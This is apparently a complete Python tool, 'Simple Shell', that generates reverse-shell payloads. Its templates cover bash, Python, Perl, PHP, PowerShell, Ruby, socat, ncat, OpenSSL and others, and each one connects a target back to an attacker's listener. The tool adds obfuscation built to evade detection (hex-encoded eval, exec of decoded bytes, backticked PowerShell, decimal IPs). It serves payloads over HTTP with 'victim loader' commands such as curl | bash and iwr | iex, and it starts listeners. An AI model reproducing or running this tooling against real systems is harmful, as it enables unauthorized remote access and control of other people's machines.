import argparse
import base64
import sys
import random
import string
import socket
import netifaces
import threading
import http.server
import subprocess
import os
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text

console = Console()

BANNER = r"""
[bold yellow] ███████╗ ██╗ ███╗   ███╗ ██████╗  ██╗      ███████╗ [/bold yellow][bold blue] ███████╗ ██╗  ██╗ ███████╗ ██╗      ██╗      [/bold blue]
[bold yellow] ██╔════╝ ██║ ████╗ ████║ ██╔══██╗ ██║      ██╔════╝ [/bold yellow][bold blue] ██╔════╝ ██║  ██║ ██╔════╝ ██║      ██║      [/bold blue]
[bold yellow] ███████╗ ██║ ██╔████╔██║ ██████╔╝ ██║      █████╗   [/bold yellow][bold blue] ███████╗ ███████║ █████╗   ██║      ██║      [/bold blue]
[bold yellow] ╚════██║ ██║ ██║╚██╔╝██║ ██╔═══╝  ██║      ██╔══╝   [/bold yellow][bold blue] ╚════██║ ██╔══██║ ██╔══╝   ██║      ██║      [/bold blue]
[bold yellow] ███████║ ██║ ██║ ╚═╝ ██║ ██║      ███████╗ ███████╗ [/bold yellow][bold blue] ███████║ ██║  ██║ ███████╗ ███████╗ ███████╗[/bold blue]
[bold yellow] ╚══════╝ ╚═╝ ╚═╝     ╚═╝ ╚═╝      ╚══════╝ ╚══════╝ [/bold yellow][bold blue] ╚══════╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚══════╝[/bold blue]
[bold cyan]                               --- SIMPLE SHELL ---[/bold cyan]
[bold black]                         Developed by: q3alique | Version: 2.0[/bold black]
"""

# Reverse shell templates with descriptions
shells = {
    "bash": {
        "command": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "description": "Standard Bash reverse shell (uses bash -c for /dev/tcp support).",
        "os": "Linux"
    },
    "python-linux": {
        "command": "python3 -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
        "description": "Python3 reverse shell for Linux systems.",
        "os": "Linux"
    },
    "python-windows": {
        "command": "python -c \"import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('{ip}',{port}));threading.Thread(target=exec,args=('while True: o=os.read(p.stdout.fileno(),1024);s.send(o)',globals()),daemon=True).start();threading.Thread(target=exec,args=('while True: i=s.recv(1024);os.write(p.stdin.fileno(),i)',globals())).start()\"",
        "description": "Threaded Python reverse shell for Windows.",
        "os": "Windows"
    },
    "perl": {
        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "description": "Perl reverse shell using Socket module.",
        "os": "Linux"
    },
    "php-linux": {
        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell for Linux (uses file descriptor 3).",
        "os": "Linux"
    },
    "php-windows": {
        "command": "php -r \"$sock=fsockopen('{ip}',{port});$proc=proc_open('cmd.exe', [[0, $sock],[1, $sock],[2, $sock]], $pipes);\"",
        "description": "PHP reverse shell for Windows using proc_open.",
        "os": "Windows"
    },
    "java": {
        "command": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])",
        "description": "Java reverse shell (Runtime.exec).",
        "os": "Linux"
    },
    "powershell-tcp": {
        "command": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command '$client = New-Object System.Net.Sockets.TCPClient(''{ip}'',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (Get-Location).Path + ''> '';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'",
        "description": "PowerShell reverse shell using TCPClient.",
        "os": "Windows"
    },
    "powershell-enc": {
        "command": "powershell -nop -w hidden -noni -ep bypass -enc {payload}",
        "description": "Encoded PowerShell payload (Base64).",
        "os": "Windows"
    },
    "ruby": {
        "command": "ruby -rsocket -e 'spawn(\"/bin/sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",\"{port}\"))'",
        "description": "Ruby reverse shell using spawn.",
        "os": "Linux"
    },
    "socat": {
        "command": "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
        "description": "Socat reverse shell (Stable PTY).",
        "os": "Linux"
    },
    "golang": {
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "description": "Golang reverse shell (requires go).",
        "os": "Linux"
    },
    "ncat": {
        "command": "ncat {ip} {port} -e /bin/bash",
        "description": "Ncat reverse shell.",
        "os": "Linux"
    },
    "openssl": {
        "command": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
        "description": "OpenSSL encrypted reverse shell.",
        "os": "Linux"
    }
}

import socket
import netifaces

def validate_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def get_interface_ip(iface):
    try:
        addrs = netifaces.ifaddresses(iface)
        return addrs[netifaces.AF_INET][0]['addr']
    except (ValueError, KeyError, IndexError):
        return None

def validate_port(port):
    return 1 <= port <= 65535

def get_listener_command(port, shell_type):
    if shell_type == "socat":
        return f"socat TCP-LISTEN:{port},reuseaddr,fork FILE:`tty`,raw,echo=0"
    elif shell_type == "openssl":
        return f"openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes && openssl s_server -quiet -key /tmp/key.pem -cert /tmp/cert.pem -port {port}"
    return f"nc -lvnp {port}"

def start_listener(port, shell_type):
    cmd = get_listener_command(port, shell_type)
    console.print(f"\n[bold yellow][*] Starting listener: {cmd}[/bold yellow]\n")
    try:
        # We use shell=True because some commands (like openssl) are multi-statement
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Listener stopped by user.[/bold red]")

def serve_payload(payload, interface_ip, port, shell_type, payload_os):
    # Strip shell wrappers to serve raw code
    raw_payload = payload
    
    # If the payload is already obfuscated with eval "$(printf ...)", we serve that as-is
    # but if it's a standard one-liner, we strip the wrapper
    if not payload.startswith('eval "$('):
        # Heuristic to extract the "inner" payload from the command line
        # We look for the first and last occurrence of ' or " and take what's inside
        first_q = -1
        last_q = -1
        for char in ["'", '"']:
            f = payload.find(char)
            l = payload.rfind(char)
            if f != -1 and l > f:
                if first_q == -1 or f < first_q:
                    first_q = f
                    last_q = l
        
        if first_q != -1:
            raw_payload = payload[first_q+1:last_q]
    
    class PayloadHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(raw_payload.encode())

        def log_message(self, format, *args):
            return

    server = http.server.ThreadingHTTPServer(('0.0.0.0', port), PayloadHandler)

    console.print(f"\n[bold green][+] Web server active at http://{interface_ip}:{port}/[/bold green]")
    console.print(f"[bold yellow][*] Victim Loader (run this on target):[/bold yellow]")

    url = f"http://{interface_ip}:{port}"
    loaders = []
    
    if payload_os == "Windows":
        if "powershell" in shell_type:
            loaders.append(f"[bold yellow]PS  -->[/bold yellow] iwr {url} -useb | iex")
        elif "python" in shell_type:
            loaders.append(f"[bold yellow]CMD -->[/bold yellow] powershell -c \"python -c ((iwr {url} -useb).Content)\"")
            loaders.append(f"[bold yellow]PS  -->[/bold yellow] python -c \"$((iwr {url} -useb).Content)\"")
        elif "php" in shell_type:
            loaders.append(f"[bold yellow]CMD -->[/bold yellow] powershell -c \"php -r ((iwr {url} -useb).Content)\"")
            loaders.append(f"[bold yellow]PS  -->[/bold yellow] php -r \"$((iwr {url} -useb).Content)\"")
        else:
            loaders.append(f"[bold yellow]PS  -->[/bold yellow] iwr {url} -outf s.exe; .\\s.exe")
    else:
        # Linux/Unix loaders
        prefix = "[bold yellow]LOADER -->[/bold yellow]"
        if "python" in shell_type:
            loaders.append(f"{prefix} python3 -c \"import urllib.request;exec(urllib.request.urlopen('{url}').read().decode())\"")
        elif "php" in shell_type:
            loaders.append(f"{prefix} php -r \"eval(file_get_contents('{url}'));\"")
        elif "perl" in shell_type:
            loaders.append(f"{prefix} curl -s {url} | perl")
        elif "ruby" in shell_type:
            loaders.append(f"{prefix} ruby -e \"require 'open-uri';eval(URI.open('{url}').read)\"")
        else:
            loaders.append(f"{prefix} curl -s {url} | bash")

    for l in loaders:
        console.print(f"    [bold cyan]{l}[/bold cyan]")
    console.print("")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()
        console.print("\n[bold red][!] Web server stopped.[/bold red]")

def generate_powershell_base64(ip, port, obfuscate=False):
    if obfuscate:
        # Use random variable names for internal logic
        v_client = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_stream = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_bytes = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_i = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_data = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_sb = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        v_sb2 = "".join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
        
        payload_code = (
            f"${v_client} = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            f"${v_stream} = ${v_client}.GetStream();"
            f"[byte[]]${v_bytes} = 0..65535|%{{0}};"
            f"while((${v_i} = ${v_stream}.Read(${v_bytes}, 0, ${v_bytes}.Length)) -ne 0){{"
            f"${v_data} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${v_bytes},0,${v_i});"
            f"${v_sb} = (iex ${v_data} 2>&1 | Out-String );"
            f"${v_sb2} = ${v_sb} + 'PS ' + (Get-Location).Path + '> ';"
            f"${v_stream}.Write(([System.Text.Encoding]::ASCII).GetBytes(${v_sb2}),0,${v_sb2}.Length);"
            f"${v_stream}.Flush()}};"
            f"${v_client}.Close()"
        )
    else:
        payload_code = (
            "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
            "$stream = $client.GetStream();"
            "[byte[]]$bytes = 0..65535|%{{0}};"
            "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
            "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
            "$sendback = (iex $data 2>&1 | Out-String );"
            "$sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> ';"
            "$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($sendback2);"
            "$stream.Write($sendbyte,0,$sendbyte.Length);"
            "$stream.Flush()}};"
            "$client.Close()"
        ).format(ip=ip, port=port)
    return base64.b64encode(payload_code.encode('utf-16le')).decode()

def mutate_ip(ip):
    # Randomly choose an IP representation: Standard or Decimal
    # Hex and Octal are sometimes inconsistent across different tools/OS
    choice = random.choice(["decimal", "standard"])
    octets = [int(o) for o in ip.split('.')]
    
    if choice == "decimal":
        return str((octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3])
    return ip

def obfuscate_bash(command):
    # Method: Environmental slicing and command string fragmentation
    # Example: eval "$(printf "\x62\x61\x73\x68")" instead of "bash"
    def hex_escape(s):
        return "".join([f"\\x{ord(c):02x}" for c in s])

    # Fragment the command and use printf to reconstruct it
    hex_cmd = hex_escape(command)
    # Using eval ensures multi-statement commands are parsed and executed correctly
    return f'eval "$(printf "{hex_cmd}")"'

def obfuscate_python(command):
    # Method: bytes.fromhex + exec
    # Detect if we are obfuscating a full command or just a script
    import re
    # Match pattern: python/python3/python.exe -c 'code' or binary -c "code"
    match = re.match(r'^([a-zA-Z0-9\.]+\s+-c\s+)([\'"])(.*)\2$', command)
    if match:
        prefix, quote, code = match.groups()
        hex_payload = code.encode().hex()
        # Use a payload that doesn't rely on backslashes or complex quotes
        new_code = f"exec(bytes.fromhex('{hex_payload}').decode())"
        # We use double quotes for the outer part to be safer on Windows PS/CMD
        return f'{prefix}"{new_code}"'
    else:
        hex_payload = command.encode().hex()
        return f"python3 -c \"exec(bytes.fromhex('{hex_payload}').decode())\""

def obfuscate_powershell_raw(command):
    # Randomize casing for the 'powershell' executable call
    command = command.replace("powershell", "".join(random.choice([c.upper(), c.lower()]) for c in "powershell"))
    
    # Surgical backticking: only target Cmdlets and common keywords.
    # We EXCLUDE method names and properties (things following a dot)
    keywords = [
        "New-Object", "Out-String", "Get-Location", "Invoke-Expression"
    ]
    
    for kw in keywords:
        if kw in command:
            obf_kw = kw[0]
            for char in kw[1:]:
                if char.lower() in ['r', 'n', 't', 'a', 'b', 'f', 'v']:
                    obf_kw += char
                else:
                    obf_kw += "`" + char
            command = command.replace(kw, obf_kw)
    
    # Handle 'iex' specifically
    command = command.replace("iex ", "`i`ex ")
    command = command.replace("(iex", "(`i`ex")
    
    return command


def list_shells():
    console.print(BANNER)
    table = Table(title="Available Payloads", style="bold cyan")
    table.add_column("Type", style="bold yellow")
    table.add_column("OS", style="bold green")
    table.add_column("Description", style="white")

    for shell_type, shell_info in shells.items():
        table.add_row(shell_type, shell_info['os'], shell_info['description'])
    
    console.print(table)

def main():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('--ip', type=str, help='IP address of the listener.')
    parser.add_argument('--port', type=int, help='Port of the listener.')
    parser.add_argument('--type', type=str, choices=shells.keys(), help='Type of reverse shell.')
    parser.add_argument('--obfuscate', action='store_true', help='Apply polymorphic obfuscation.')
    parser.add_argument('-l', '--list', action='store_true', help='List available shell types.')
    parser.add_argument('-h', '--help', action='store_true', help='Show help message.')
    parser.add_argument('--raw', action='store_true', help='Output only the raw payload command.')
    parser.add_argument('--serve', type=int, nargs='?', const=80, help='Start a web server to serve the payload (default port 80).')
    parser.add_argument('--listen', action='store_true', help='Automatically start the listener.')

    args = parser.parse_args()

    if args.help or (not args.list and not args.type):
        console.print(BANNER)
        help_table = Table(show_header=False, box=None, padding=(0, 2))
        help_table.add_column("Option", style="bold yellow", width=35)
        help_table.add_column("Description", style="white")
        help_table.add_row("\n[bold cyan]Required Parameters[/bold cyan]", "")
        help_table.add_row("--ip [green]IP/IFACE[/green]", "Listener IP or interface (e.g. eth0)")
        help_table.add_row("--port [green]PORT[/green]", "Listener Port")
        help_table.add_row("--type [green]TYPE[/green]", "Payload type to generate")
        help_table.add_row("\n[bold cyan]General Options[/bold cyan]", "")
        help_table.add_row("--obfuscate", "Enable polymorphic mutation/obfuscation")
        help_table.add_row("-l, --list", "List available shell types with descriptions")
        help_table.add_row("-h, --help", "Show help message and exit")
        help_table.add_row("--serve [PORT]", "Serve payload via HTTP (default port 80)")
        help_table.add_row("--listen", "Start the listener automatically")
        
        help_table.add_row("\n[bold cyan]Available Payloads[/bold cyan]", "")
        # Split payloads by OS for better organization in help
        for shell_type, shell_info in shells.items():
            os_color = "green" if shell_info['os'] == "Linux" else "blue" if shell_info['os'] == "Windows" else "white"
            help_table.add_row(f"[bold yellow]{shell_type}[/bold yellow] [dim]({shell_info['os']})[/dim]", shell_info['description'])
            
        console.print(help_table)
        return

    if args.list:
        list_shells()
        return

    if not args.ip or not args.port:
        console.print("[bold red][!] Error: --ip/--interface and --port are required for generation.[/bold red]")
        return

    # Check if input is IP or interface
    ip_to_use = args.ip
    if not validate_ip(args.ip):
        ip_from_iface = get_interface_ip(args.ip)
        if ip_from_iface:
            ip_to_use = ip_from_iface
        else:
            console.print(f"[bold red][!] Error: '{args.ip}' is neither a valid IP address nor a valid interface with an IPv4 address.[/bold red]")
            return
    
    if not validate_port(args.port):
        console.print(f"[bold red][!] Error: Invalid port '{args.port}'. Must be 1-65535.[/bold red]")
        return

    # Generate the shell code
    if args.type == "powershell-enc":
        # Encoded payloads already use a different method; we won't mutate the IP inside
        # to avoid complexity, but we obfuscate the final raw wrapper if requested.
        encoded_payload = generate_powershell_base64(ip_to_use, args.port, obfuscate=args.obfuscate)
        shell_code = shells[args.type]['command'].format(payload=encoded_payload)
        if args.obfuscate:
            shell_code = obfuscate_powershell_raw(shell_code)
    else:
        # Mutate IP for raw commands if obfuscation is enabled
        final_ip = ip_to_use
        if args.obfuscate:
            # We only mutate the IP if it's a standard IP and the payload type
            # is a system tool that natively supports non-standard IP formats.
            # Language-based payloads (python, php, etc.) are already hex-obfuscated.
            if validate_ip(ip_to_use) and any(x in args.type for x in ["bash", "socat", "ncat", "openssl"]):
                final_ip = mutate_ip(ip_to_use)
        
        shell_code = shells[args.type]['command'].format(ip=final_ip, port=args.port)
        
        if args.obfuscate:
            if any(x in args.type for x in ["bash", "socat", "ruby", "perl", "php", "ncat", "openssl"]):
                shell_code = obfuscate_bash(shell_code)
            elif "python" in args.type:
                shell_code = obfuscate_python(shell_code)
            elif "powershell" in args.type:
                shell_code = obfuscate_powershell_raw(shell_code)

    if args.raw:
        sys.stdout.write(shell_code)
        sys.stdout.flush()
        return

    console.print(BANNER)
    
    # Display logic
    if ip_to_use != args.ip:
        listener_info = f"[green]{ip_to_use}[/green] [dim]({args.ip})[/dim]"
    else:
        listener_info = f"[green]{ip_to_use}[/green]"

    obf_status = "ENABLED" if args.obfuscate else "DISABLED"
    if args.obfuscate and "final_ip" in locals() and final_ip != ip_to_use:
        obf_status += f" [dim](IP Mutated: {final_ip})[/dim]"

    summary_panel = Panel(
        Text.from_markup(f"[bold white]Type:[/bold white] [cyan]{args.type}[/cyan]\n[bold white]Listener:[/bold white] {listener_info}:[green]{args.port}[/green]\n[bold white]Obfuscation:[/bold white] [{'bold green' if args.obfuscate else 'bold red'}] {obf_status}"),
        title="[bold yellow]Payload Generation Summary[/bold yellow]",
        border_style="bold blue"
    )
    console.print(summary_panel)
    
    listener_cmd = get_listener_command(args.port, args.type)
    console.print(f"\n[bold cyan]Recommended Listener:[/bold cyan]")
    console.print(f"[bold green]{listener_cmd}[/bold green]")
    
    console.print("\n[bold cyan]Payload Command (Ready to Copy):[/bold cyan]")

    console.print("-" * 80, style="dim")
    # Use a separate console with soft_wrap to ensure no line breaks are injected
    copy_console = Console(soft_wrap=True, highlight=False)
    copy_console.print(shell_code, style="bold yellow")
    console.print("-" * 80, style="dim")

    # Handle Listen and Serve
    if args.listen and args.serve:
        # Run server in background thread, listener in foreground
        server_thread = threading.Thread(target=serve_payload, args=(shell_code, ip_to_use, args.serve, args.type, shells[args.type]['os']), daemon=True)
        server_thread.start()
        start_listener(args.port, args.type)
    elif args.listen:
        start_listener(args.port, args.type)
    elif args.serve:
        serve_payload(shell_code, ip_to_use, args.serve, args.type, shells[args.type]['os'])

if __name__ == '__main__':
    main()
